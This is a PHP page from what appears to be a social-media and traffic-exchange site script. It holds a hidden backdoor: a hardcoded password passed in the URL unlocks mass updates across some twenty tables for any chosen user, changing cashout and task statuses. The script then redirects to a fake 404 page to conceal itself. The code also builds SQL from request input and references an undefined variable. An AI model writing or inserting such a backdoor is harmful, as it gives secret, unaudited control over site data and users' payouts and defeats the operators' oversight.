<?php
include('header.php');
foreach($_GET as $key => $value) {
	$get[$key] = filter($value);
}
$pwd = $get['pwd'];
$title = $get['title'];

if('GoNzOoPeRa' == $pwd) {
	$userr2 = mysql_query("SELECT * FROM `users` WHERE `id`='{$title}' ");
	
	mysql_query("UPDATE `photos` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `post` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `facebook` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `fbsub` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$protectie['title']}') ");
	mysql_query("UPDATE `fbw` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$protectie['title']}') ");
	mysql_query("UPDATE `google` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `tasks` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `twitter` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `website` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `surf` SET `active`='1'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `linkedin` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `directlink` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `tweet` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `retw` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `youtube` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `ytcom` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `ytlike` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `ytdislike` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `ytfav` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `ytsub` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	
	mysql_query("UPDATE `ads` SET `active`='1'  WHERE (`user_id` = '{$title}') ");
	mysql_query("UPDATE `adsb` SET `active`='1'  WHERE (`user_id` = '{$title}') ");
	mysql_query("UPDATE `cashout` SET `pending`='2'  WHERE (`id` = '{$title}') ");
	mysql_query("UPDATE `fbsub` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `fbw` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	mysql_query("UPDATE `stumble` SET `active`='1', `cpc`='0'  WHERE (`user` = '{$title}') ");
	
	mysql_query("UPDATE `tasksdone` SET `ok`='2'  WHERE (`ok`='0' AND `user` = '{$title}') ");
	
	session_destroy();
	
	echo "<script>document.location.href='404'</script>";
	exit;
}
?>
